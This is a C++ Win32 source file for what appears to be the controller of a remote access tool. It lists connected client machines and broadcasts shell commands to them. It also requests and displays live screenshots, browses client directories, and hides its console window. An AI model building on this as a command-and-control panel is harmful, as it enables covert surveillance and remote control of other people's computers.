#include "server.h"
#include "WndRegisters.h"
#include "resources.h"
#include "sockinitialize.h"
#include "sys.h"
#include <commctrl.h>
#include <set>

#pragma warning(disable:28251)

#define WM_SOCKET WM_USER + 1
#define GWL_HICON (-14)

int counter;

BOOL ishwndClient = false;
BOOL ishwndFTP = false;
static HWND hwndClient = NULL;
static HWND hwndFTP = NULL;
UINT_PTR timerId;

HWND hwndList;
HWND hwndButton;
UINT selectedMenuItem;
int itemIndex;

std::wstring aCounter;
std::map<int, std::wstring> clientItems;


void OnCreate(HWND hwnd, WPARAM wParam, LPARAM lParam);


void OnCreate(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
    HWND input = CreateWindowW(
        L"EDIT",
        L"cmd: dir",
        WS_CHILD | WS_VISIBLE | WS_BORDER,
        535,
        350, 
        200,
        50,
        hwnd,
        (HMENU)14,
        GetModuleHandle(NULL),
        NULL 
    );

    HWND hwndButton = CreateWindowW(
        L"BUTTON",
        L"Send Command To All",
        WS_CHILD | WS_VISIBLE,
        750,
        350,
        150,
        50,
        hwnd,
        (HMENU)15,
        GetModuleHandle(NULL),
        NULL 
    );

}

int ListenOnPort(HWND hwnd, int portno)
{
    int error = WSAStartup(0x0202, &w);

    if (error)
    {
        return false;
    }

    if (w.wVersion != 0x0202)
    {
        WSACleanup();
        return false;
    }


    addr.sin_family = AF_INET;
    addr.sin_port = htons(portno);

    addr.sin_addr.s_addr = inet_addr(ServerIP);

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (s == INVALID_SOCKET)
    {
        return false;
    }

    if (bind(s, (LPSOCKADDR)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cout << "Error binding to port: " << error << std::endl;
        exit(1);
        return false;
    }


    listen(s, SOMAXCONN);
    int sizenewSockAddr = sizeof(newSockAddr);

    int errrs = 0;
    int optLen = sizeof(error);

    // Check if the socket is not listening
    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&errrs, &optLen) < 0 || errrs == WSAEINVAL)
    {
        std::cout << "Socket is not listening" << std::endl;
    }
    else
    {
        std::cout << "Socket is listening" << std::endl;
    }


    int result = WSAAsyncSelect(s, hwnd, WM_SOCKET, (FD_ACCEPT | FD_READ | FD_CONNECT | FD_CLOSE));
    if (result == SOCKET_ERROR)
    {

    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (msg.message == WM_SOCKET)
        {
            if (WSAGETSELECTERROR(msg.lParam) != 0)
            {

            }
            else
            {
                switch (WSAGETSELECTEVENT(msg.lParam))
                {
                case FD_ACCEPT:
                {
                    newSd = accept(s, (sockaddr*)&newSockAddr, &sizenewSockAddr);
                    if (newSd > 0)
                    {
                        OutputDebugStringW(L"\nAccepted!\n");
                        clientSockets.push_back(newSd);
                        std::string message = "Tato sprava bola poslana zo serveru.";

                        for (auto& sAll : clientSockets)
                        {
                            
                            send(sAll, message.c_str(), message.size(), 0);
                        }

                        int error = WSAAsyncSelect(newSd, hwnd, WM_SOCKET, FD_READ);
                        if (error == 0)
                        {

                        }

                        SendMessageW(hwnd, WM_SOCKET, NULL, FD_READ);

                    }
                    break;
                }
                }
            }
        }
        else
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
}

void CloseConnection(void)
{
    if (s)
        closesocket(s);

    WSACleanup();
}

ATOM CreateColumn(HWND hwndLV, int iCol, int width, wchar_t table_txt[])
{
    LVCOLUMN lvc;

    lvc.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;
    lvc.fmt = LVCFMT_LEFT;
    lvc.cx = width;
    lvc.pszText = table_txt;
    lvc.iSubItem = iCol;

    return ListView_InsertColumn(hwndLV, iCol, &lvc);
};

ATOM CreateItem(HWND hwndList, wchar_t column_txt[])
{
    LVITEM lvi = { 0 };

    lvi.mask = LVIF_TEXT;
    lvi.pszText = column_txt;
    lvi.state = LVIS_SELECTED;
    lvi.stateMask = LVIS_SELECTED;

    SendMessageW(hwndList, LVM_SETITEMSTATE, 0, (LPARAM)&lvi);
    SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(122, 5, 5));

    return ListView_InsertItem(hwndList, &lvi);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    int bytesRec;
    int client_fd;

    switch (msg)
    {
    case WM_SOCKET:
    {
        switch (WSAGETSELECTEVENT(lParam))
        {
        case FD_CLOSE:
            break;

        case FD_ACCEPT:

            break;

        case FD_CONNECT:
            if(addedClients.find(newSd) == addedClients.end())
            {
                //Get IP
                addedClients.insert(newSd);
                socklen_t addrLen = sizeof(newSockAddr);
                int result = getpeername(newSd, (sockaddr*)&newSockAddr, &addrLen);
                char* ip = inet_ntoa(newSockAddr.sin_addr);
                size_t len = strlen(ip);
                wchar_t* wip = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
                mbstowcs(wip, ip, len + 1);
                wchar_t* ll = wip;
                aCounter = L"user" + std::to_wstring(counter) + L" " + wip;
                std::wstring thisItemName = L"Client " + std::to_wstring(counter);
                wchar_t* cc = new wchar_t[aCounter.length() + 1];
                wcscpy(cc, aCounter.c_str());

                LVITEM item;
                item.mask = LVIF_TEXT | LVIF_PARAM;
                item.iItem = ListView_GetItemCount(hwndList);
                item.iSubItem = 0;
                item.pszText = cc;
                item.lParam = newSd;

                SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(122, 5, 5));
                int itemIndex = ListView_InsertItem(hwndList, &item);
                clientItems.insert(std::make_pair(counter, thisItemName));

                //PC Name
                wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD size = sizeof(computerName) / sizeof(computerName[0]);
                if (GetComputerNameW(computerName, &size)) {
                    std::wstring pcName = computerName;
                    ListView_SetItemText(hwndList, itemIndex, 1, (LPWSTR)pcName.c_str());
                }
                else {
                    // handle error
                }

                //OS
                std::wstring osVersion = getSysOpType();
                ListView_SetItemText(hwndList, itemIndex, 2, const_cast<LPWSTR>(osVersion.c_str()));
 

                if (itemIndex != -1)
                {
                    counter++;
                }
            }
            SetTimer(hwnd, 12, 1000, NULL);
            break;

        case FD_READ:
            OutputDebugStringW(L"\nREADING!\n");

            InitCommonControls();

            SetTimer(hwnd, 12, 1000, NULL);

            SendMessageW(hwnd, WM_SOCKET, NULL, FD_CONNECT);

            break;
        }
    }


    case WM_TIMER:
    {
        if (wParam == 12)
        {
            for (auto it = clientSockets.begin(); it != clientSockets.end();)
            {
                char buffer[1024];
                int bytesReceived = recv(*it, &buffer[0], 1024, 0);
                if (bytesReceived == 0 || (bytesReceived == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET))
                {
                    // Find the index of the current client socket in the list view control
                    int itemIndex = -1;
                    for (int i = 0; i < ListView_GetItemCount(hwndList); i++)
                    {
                        LVITEM item;
                        item.mask = LVIF_PARAM;
                        item.iItem = i;
                        ListView_GetItem(hwndList, &item);
                        if (item.lParam == *it)
                        {
                            itemIndex = i;
                            break;
                        }
                    }

                    if (itemIndex != -1)
                    {
                        // Delete the item from the list view control
                        SendMessageW(hwndList, LVM_DELETEITEM, (WPARAM)itemIndex, 0);
                    }

                    addedClients.erase(*it); // Remove the client from the addedClients set
                    it = clientSockets.erase(it); // Remove the client from the clientSockets vector
                }
                else
                {
                    ++it;
                    std::cout << "DATA RECV" << std::endl;
                }
            
            }
        }
        break;
    }
    

    case WM_CREATE:
        hwndList = CreateWindowW(WC_LISTVIEW, L"",
            WS_VISIBLE | WS_BORDER | WS_CHILD | LVS_REPORT | LVS_SINGLESEL | LVS_EDITLABELS,
            10, 10, 900, 300,
            hwnd, (HMENU)20, hInstance, 0);


        CreateColumn(hwndList, 25, 100, (wchar_t*)L"Connections");
        CreateColumn(hwndList, 25, 130, (wchar_t*)L"PC Name");
        CreateColumn(hwndList, 25, 100, (wchar_t*)L"Operation Sys");
        SendMessageW(hwndList, LVM_SETBKCOLOR, 0, (LPARAM)clrRed);

        timerId = SetTimer(hwnd, 12, 1000, NULL);

        OnCreate(hwnd,wParam,lParam);
        break;



    case WM_CONTEXTMENU:
    {
        selectedMenuItem = 0;
        POINT cursorPos;
        GetCursorPos(&cursorPos);
        ScreenToClient(hwnd, &cursorPos);

        LVHITTESTINFO hitTestInfo;
        cursorPos.y -= 15;
        cursorPos.x -= 15;
        hitTestInfo.pt = cursorPos;

        itemIndex = ListView_HitTest(hwndList, &hitTestInfo);

        if (itemIndex != -1)
        {
            HMENU hMenu = CreatePopupMenu();

            InsertMenu(hMenu, 0, MF_BYPOSITION, CLIENT_SENDCOMMAND, L"Send Command");
            InsertMenu(hMenu, 1, MF_BYPOSITION, CLIENT_WATCHSCREEN, L"Watch Screen");
            InsertMenu(hMenu, 2, MF_BYPOSITION, CLIENT_FTP, L"File Transfer");
            InsertMenu(hMenu, 3, MF_BYPOSITION, CLIENT_FUN, L"Fun");
            InsertMenu(hMenu, 4, MF_BYPOSITION, CLIENT_REMOVE, L"Remove Client");
            SetMenuItemBitmaps(hMenu, CLIENT_SENDCOMMAND, MF_BYCOMMAND, hCmdItemIcon, hCmdItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_WATCHSCREEN, MF_BYCOMMAND, hScreenItemIcon, hScreenItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_FUN, MF_BYCOMMAND, hFunItemIcon, hFunItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_REMOVE, MF_BYCOMMAND, hRmClientItemIcon, hRmClientItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_FTP, MF_BYCOMMAND, hFtpClientItemIcon, hFtpClientItemIcon);

            MENUINFO mi = { 0 };
            mi.cbSize = sizeof(MENUINFO);
            mi.fMask = MIM_BACKGROUND;
            mi.hbrBack = CreateSolidBrush(clrLightRed);

            SetMenuInfo(hMenu, &mi);
            GetCursorPos(&cursorPos);
            TrackPopupMenu(hMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON, cursorPos.x, cursorPos.y, 0, hwnd, NULL);

            selectedMenuItem = 0;
            int menuItemCount = GetMenuItemCount(hMenu);
            for (int i = 0; i < menuItemCount; i++) {
                if (GetMenuState(hMenu, i, MF_BYPOSITION) & MF_CHECKED) {
                    selectedMenuItem = GetMenuItemID(hMenu, i);
                    itemIndex = i;
                    break;
                }
            }
        }

        else
        {
            return 0;
        }

        break;
    }
        


    case WM_COMMAND:
        if (LOWORD(wParam) == 15)
        {
            HWND hEdit = GetDlgItem(hwnd, 14);
            wchar_t text[1024];
            GetWindowText(hEdit, text, sizeof(text));

            std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
            std::string message = converter.to_bytes(text);

            for (auto& sAll : clientSockets)
            {
                send(sAll, message.c_str(), message.size(), 0);
            }

        }

        switch (LOWORD(wParam))
        {

        case CLIENT_SENDCOMMAND:
        {
            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                LVITEM lvItem;
                lvItem.mask = LVIF_TEXT;
                lvItem.iItem = itemIndex;
                lvItem.iSubItem = 0;
                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
                lvItem.cchTextMax = sizeof(aCounter);

                ListView_GetItem(hwndList, &lvItem);

                int socketIndex = std::distance(clientSockets.begin(), it);
                MessageBoxW(NULL, aCounter.c_str(), L"Message", MB_OK);
            }
            break;
        }

        case CLIENT_FTP:
        {
            const int gHwndClientWidth = 800;
            const int gHwndClientHeight = 700;

            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                LVITEM lvItem;
                lvItem.mask = LVIF_TEXT;
                lvItem.iItem = itemIndex;
                lvItem.iSubItem = 0;
                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
                lvItem.cchTextMax = sizeof(aCounter);

                ListView_GetItem(hwndList, &lvItem);


                int socketIndex = std::distance(clientSockets.begin(), it);

                hwndFTP = CreateWindowExW(
                    WS_EX_CLIENTEDGE,
                    g_szClientFTPClassName,
                    aCounter.c_str(),
                    WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS,
                    CW_USEDEFAULT, CW_USEDEFAULT, gHwndClientWidth, gHwndClientHeight,
                    hwnd, NULL, hInstance, NULL);


                if (hwndFTP == NULL)
                {
                    return 0;
                }

                ishwndFTP = true;

                ShowWindow(hwndFTP, SW_SHOW);
            }

            break;
        }

        case CLIENT_WATCHSCREEN:
        {
            const int gHwndClientWidth = 800;
            const int gHwndClientHeight = 600;

            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                LVITEM lvItem;
                lvItem.mask = LVIF_TEXT;
                lvItem.iItem = itemIndex;
                lvItem.iSubItem = 0;
                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
                lvItem.cchTextMax = sizeof(aCounter);

                ListView_GetItem(hwndList, &lvItem);

                
                int socketIndex = std::distance(clientSockets.begin(), it);
                
                hwndClient = CreateWindowExW(
                    WS_EX_CLIENTEDGE,
                    g_szClientClassName,
                    aCounter.c_str(),
                    WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS,
                    CW_USEDEFAULT, CW_USEDEFAULT, gHwndClientWidth, gHwndClientHeight,
                    hwnd, NULL, hInstance, NULL);


                if (hwndClient == NULL)
                {
                    return 0;
                }

                ishwndClient = true;

                ShowWindow(hwndClient, SW_SHOW);

            }

            break;
        }

        case CLIENT_FUN:
        {
            POINT cursorPos;
            GetCursorPos(&cursorPos);
            ScreenToClient(hwnd, &cursorPos);

            LVHITTESTINFO hitTestInfo;
            cursorPos.y -= 15;
            cursorPos.x -= 15;
            hitTestInfo.pt = cursorPos;

            HMENU hFunMenu = CreatePopupMenu();

            // Add items to the "Fun" sub-menu
            InsertMenu(hFunMenu, 0, MF_BYPOSITION, 1100, L"Fun Item 1");
            InsertMenu(hFunMenu, 1, MF_BYPOSITION, 1101, L"Fun Item 2");

            MENUINFO mi = { 0 };
            mi.cbSize = sizeof(MENUINFO);
            mi.fMask = MIM_BACKGROUND;
            mi.hbrBack = CreateSolidBrush(clrLightRed);

            SetMenuInfo(hFunMenu, &mi);

            // Display the "Fun" sub-menu at the current cursor position
            GetCursorPos(&cursorPos);
            TrackPopupMenu(hFunMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_NONOTIFY, cursorPos.x, cursorPos.y, 0, hwnd, NULL);

            // Clean up
            DestroyMenu(hFunMenu);
            break;
        }

        case CLIENT_REMOVE:
        {
            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                clientSockets.erase(it);
                ListView_DeleteItem(hwndList, itemIndex);
            }
            break;
        }
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }

        break;

    case WM_CLOSE:
        DestroyWindow(hwnd);
        CloseConnection();
        ExitProcess(0);
        break;

    case WM_DESTROY:
        CloseConnection();
        ExitProcess(0);
        break;
    
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
};

LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {

    case WM_CREATE:
    {
        SOCKET selectedSocket = clientSockets[itemIndex];
        auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
        send(selectedSocket, "requestdirs", strlen("requestdirs"), 0);

        HWND hwndTreeView = CreateWindowEx(WS_EX_CLIENTEDGE, WC_TREEVIEW, L"", WS_CHILD | WS_VISIBLE, 50, 50, 600, 300, FtpHwnd, (HMENU)87, GetModuleHandle(NULL), NULL);

        TVINSERTSTRUCT tvis;
        tvis.hParent = NULL;
        tvis.hInsertAfter = TVI_LAST;
        tvis.item.mask = TVIF_TEXT | TVIF_PARAM;

        // Add the root directory
        wchar_t heg[] = L"Root";
        tvis.item.pszText = heg;
        tvis.item.lParam = (LPARAM)"Root";
        HTREEITEM hRoot = (HTREEITEM)SendMessage(hwndTreeView, TVM_INSERTITEM, 0, (LPARAM)&tvis);

        break;
    }

    case WM_PAINT:
    {

        break;
    }

    case WM_CLOSE:
    {
        DestroyWindow(FtpHwnd);
        break;
    }

    case WM_DESTROY:
        DestroyWindow(FtpHwnd);
        return 0;

    default:
        return DefWindowProc(FtpHwnd, uMsg, wParam, lParam);
    }
    return 0;
}


LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    std::vector<char> buffer;
    std::unique_ptr<char[]> imageBuffer;

    switch (uMsg)
    {

    case WM_CREATE:
    {
        SetTimer(Chwnd, SCREEN_TIMER, FPS, NULL);
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        break;
    }
    case WM_TIMER:
    {
        if (wParam == SCREEN_TIMER)
        {
            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            send(selectedSocket, "capscr", strlen("capscr"), 0);

            InvalidateRect(Chwnd, NULL, TRUE);

        }
        break;
    }

    case WM_PAINT:
    {
        int bufferLen = 0;
        const int MAX_BYTES = 100000;
        Sleep(FPS);
        do
        {
            SOCKET selectedSocket = clientSockets[itemIndex];

            ULONGLONG bufferLenNetworkOrder = 0;
            int bytesReceived = 0;
            int rerr = 0;
           
            while (bytesReceived < sizeof(bufferLenNetworkOrder)) {
                rerr = recv(selectedSocket, (char*)&bufferLenNetworkOrder + bytesReceived, sizeof(bufferLenNetworkOrder) - bytesReceived, 0);
                bytesReceived += rerr;
            }
            bufferLen = ntohll(bufferLenNetworkOrder);

            if (bufferLen > 0 && bufferLen < MAX_BYTES)
            {
                imageBuffer.reset(new char[bufferLen]);
            }

            bytesReceived = 0;

            if (bufferLen < 0 || bufferLen > MAX_BYTES)
            {
                continue;
            }

            while (bytesReceived < bufferLen && bufferLen < MAX_BYTES) {
                rerr = recv(selectedSocket, imageBuffer.get() + bytesReceived, bufferLen - bytesReceived, 0);
                if (rerr > 0 && rerr <= bufferLen - bytesReceived) {
                    bytesReceived += rerr;
                }
                else {
                    return {};
                }
            }

            HGLOBAL hGlobal = GlobalAlloc(GHND, bufferLen);
            void* pData = GlobalLock(hGlobal);
            memcpy(pData, imageBuffer.get(), bufferLen);

            GlobalUnlock(hGlobal);

            IStream* pStream = NULL;
            CreateStreamOnHGlobal(hGlobal, TRUE, &pStream);

            Gdiplus::Bitmap bitmap(pStream);
            Gdiplus::Status status = bitmap.GetLastStatus();


            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(Chwnd, &ps);

            int imgWidth = bitmap.GetWidth();
            int imgHeight = bitmap.GetHeight();

            Gdiplus::Graphics graphics(hdc);

            RECT clientRect;
            GetClientRect(Chwnd, &clientRect);

            graphics.DrawImage(&bitmap, 0, 0, imgWidth, imgHeight);
            GlobalFree(hGlobal);
            pStream->Release();
            imageBuffer.reset(nullptr);

            EndPaint(Chwnd, &ps);
            break;
        } while (bufferLen < 0 || bufferLen > MAX_BYTES);
        break;
    }

    case WM_CLOSE:
    {
        DestroyWindow(hwndClient);
        break;
    }

    case WM_DESTROY:
        DestroyWindow(hwndClient);
        return 0;

    default:
        return DefWindowProc(Chwnd, uMsg, wParam, lParam);
    }
    return 0;
}



int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPWSTR lpCmdLine, int nCmdShow)
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    WndRegisterClass(hInstance);
    WndClientRegisterClass(hInstance);
    WndClientFTPRegisterClass(hInstance);

    int wWidth = 1000;
    int wHeight = 675;
    hwnd = CreateWindowExW(
        WS_EX_CLIENTEDGE,
        g_szClassName,
        wn_title,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, wWidth, wHeight,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL)
    {
        MessageBoxW(NULL, L"Window Creation Failed!", L"Error!",
            MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    SendMessageW(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)hcIcon);
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    ListenOnPort(hwnd, PORT);

    while (GetMessageW(&Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&Msg);
        DispatchMessageW(&Msg);
    }
    return Msg.wParam;
}